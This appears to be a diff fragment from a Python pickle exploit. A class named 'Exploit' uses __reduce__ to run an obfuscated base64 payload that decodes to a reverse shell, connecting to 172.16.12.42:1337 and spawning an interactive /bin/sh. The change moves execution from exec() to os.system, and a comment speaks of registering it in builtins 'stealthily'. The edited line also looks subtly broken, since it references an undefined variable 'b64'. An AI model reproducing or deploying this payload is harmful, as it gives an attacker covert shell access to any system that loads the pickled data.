@@ -11,7 +11,7 @@ class Exploit:
     def __reduce__(self):
         import base64
         payload = b'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOwpzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsKcy5jb25uZWN0KCgiMTcyLjE2LjEyLjQyICIsMTMzNykpOwpvcy5kdXAyKHMuZmlsZW5vKCksMCk7Cm9zLmR1cDIocy5maWxlbm8oKSwxKTsKb3MuZHVwMihzLmZpbGVubygpLDIpOwpzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkK'
-        return (exec, (compile(base64.b64decode(payload), "<string>", "exec"),))
+        return (os.system, ("python3 -c \"$(echo {} | base64 -d)\"".format(b64.decode()),))
 
 
 # Register in builtins stealthily
